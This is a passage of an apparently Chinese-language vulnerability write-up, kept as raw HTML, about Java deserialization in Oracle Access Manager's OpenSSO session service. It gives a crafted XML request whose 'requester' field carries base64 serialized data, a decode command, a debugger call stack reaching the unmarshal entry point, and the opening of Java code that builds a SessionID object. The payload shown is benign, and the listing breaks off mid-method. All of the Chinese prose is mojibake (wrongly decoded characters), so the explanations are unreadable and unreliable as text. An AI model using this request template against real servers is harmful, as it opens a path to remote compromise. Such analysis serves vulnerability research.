</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 338
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;b2JqZWN0OnJPMEFCWFFBRUdobGJHeHZJR3BoZG1GdlltcGxZM1E9&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>å…¶ä¸­requesterå‚æ•°å€¼ä¸ºåºåˆ—åŒ–æ•°æ®åŠ ä¸Š<code>object:</code>å‰ç¼€çš„base64ç¼–ç åæ•°æ®ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-53-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-53-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-53-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-53-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ echo b2JqZWN0OnJPMEFCWFFBRUdobGJHeHZJR3BoZG1GdlltcGxZM1E9 | base64 -d
</span></span><span style=display:flex><span>object:rO0ABXQAEGhlbGxvIGphdmFvYmplY3Q<span style=color:#f92672>=</span>
</span></span></code></pre></td></tr></table></div></div><p>è·Ÿè¸ªè°ƒè¯•ï¼Œåˆ°æ­¤å¤„ <code>oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal</code> ä¼ å…¥çš„<code>requester</code>å‚æ•°å¯¹åº”çš„æ•°æ®è¢«ååºåˆ—åŒ–ã€‚</p><p><img loading=lazy src=image-20220323101521761.png alt=image-20220323101521761></p><p>è‡³æ­¤æˆ‘ä»¬ç¡®å®šäº†ååºåˆ—åŒ–çš„å…¥å£ç‚¹æ˜¯åœ¨ <code>oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal</code> ã€‚</p><p>ååºåˆ—åŒ–å¼€å§‹å‰çš„å®Œæ•´è°ƒç”¨æ ˆ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-54-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-54-50>50</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>unmarshal:2439, OpenssoEngineController (oracle.security.am.proxy.opensso.controller)
</span></span><span style=display:flex><span>processEvent:1069, OpenssoEngineController (oracle.security.am.proxy.opensso.controller)
</span></span><span style=display:flex><span>processEvent:596, MasterController (oracle.security.am.controller)
</span></span><span style=display:flex><span>processRequest:788, MasterController (oracle.security.am.controller)
</span></span><span style=display:flex><span>process:708, MasterController (oracle.security.am.controller)
</span></span><span style=display:flex><span>delegateToMasterController:221, PBLFlowManager (oracle.security.am.pbl)
</span></span><span style=display:flex><span>handleBaseEvent:147, PBLFlowManager (oracle.security.am.pbl)
</span></span><span style=display:flex><span>processRequest:107, PBLFlowManager (oracle.security.am.pbl)
</span></span><span style=display:flex><span>handleRequest:221, AMServlet (oracle.security.am.pbl.transport.http)
</span></span><span style=display:flex><span>doPost:177, AMServlet (oracle.security.am.pbl.transport.http)
</span></span><span style=display:flex><span>service:707, HttpServlet (javax.servlet.http)
</span></span><span style=display:flex><span>service:790, HttpServlet (javax.servlet.http)
</span></span><span style=display:flex><span>run:295, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:260, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>invokeServlet:137, StubSecurityHelper (weblogic.servlet.internal)
</span></span><span style=display:flex><span>execute:353, ServletStubImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:25, TailFilter (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:175, JpsAbsFilter$3 (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doPrivileged:-1, AccessController (java.security)
</span></span><span style=display:flex><span>doAsPrivileged:315, JpsSubject (oracle.security.jps.util)
</span></span><span style=display:flex><span>runJaasMode:650, JpsPlatformUtil (oracle.security.jps.ee.util)
</span></span><span style=display:flex><span>runJaasMode:112, JpsAbsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilterInternal:293, JpsAbsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilter:150, JpsAbsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilter:94, JpsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:248, DMSServletFilter (oracle.dms.servlet)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:92, ExtensibleGlobalFilter (oracle.jrf.servlet)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>wrapRun:3797, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:3763, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doAs:344, AuthenticatedSubject (weblogic.security.acl.internal)
</span></span><span style=display:flex><span>runAsForUserCode:197, SecurityManager (weblogic.security.service)
</span></span><span style=display:flex><span>runAsForUserCode:203, WlsSecurityProvider (weblogic.servlet.provider)
</span></span><span style=display:flex><span>run:71, WlsSubjectHandle (weblogic.servlet.provider)
</span></span><span style=display:flex><span>doSecuredExecute:2451, WebAppServletContext (weblogic.servlet.internal)
</span></span><span style=display:flex><span>securedExecute:2299, WebAppServletContext (weblogic.servlet.internal)
</span></span><span style=display:flex><span>execute:2277, WebAppServletContext (weblogic.servlet.internal)
</span></span><span style=display:flex><span>runInternal:1720, ServletRequestImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:1680, ServletRequestImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)
</span></span><span style=display:flex><span>_runAs:352, ComponentInvocationContextManager (weblogic.invocation)
</span></span><span style=display:flex><span>runAs:337, ComponentInvocationContextManager (weblogic.invocation)
</span></span><span style=display:flex><span>doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)
</span></span><span style=display:flex><span>runWorkUnderContext:41, PartitionUtility (weblogic.work)
</span></span><span style=display:flex><span>runWorkUnderContext:655, SelfTuningWorkManagerImpl (weblogic.work)
</span></span><span style=display:flex><span>execute:420, ExecuteThread (weblogic.work)
</span></span><span style=display:flex><span>run:360, ExecuteThread (weblogic.work)
</span></span></code></pre></td></tr></table></div></div><h3 id=æ„é€ sessionidå¯¹è±¡è§¦å‘æ­£å¸¸ååºåˆ—åŒ–>æ„é€ SessionIDå¯¹è±¡è§¦å‘æ­£å¸¸ååºåˆ—åŒ–<a hidden class=anchor aria-hidden=true href=#æ„é€ sessionidå¯¹è±¡è§¦å‘æ­£å¸¸ååºåˆ—åŒ–>#</a></h3><p>ä»ä»£ç  <code>oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal</code> çœ‹ï¼Œæ¥å£ <code>/oam/server/opensso/sessionservice</code> æƒ³è¦çš„å¯¹è±¡æ•°æ®æ˜¯ <code>oracle.security.am.proxy.opensso.session.utils.SessionID</code> ç±»çš„ã€‚æˆ‘ä»¬æ¥æ„é€ ä¸€ä¸ªå¯ä»¥æ­£å¸¸å®Œæ•´è§¦å‘ååºåˆ—åŒ–çš„å¯¹è±¡æ•°æ®ã€‚</p><p>ç”Ÿæˆ<code>requester</code>ä¸­çš„åºåˆ—åŒ–æ•°æ®ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-36>36</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> oracle.security.am.proxy.opensso.session.utils.SessionID<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>App</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        sessionidobj<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>sessionidobj</span><span style=color:#f92672>(){</span>
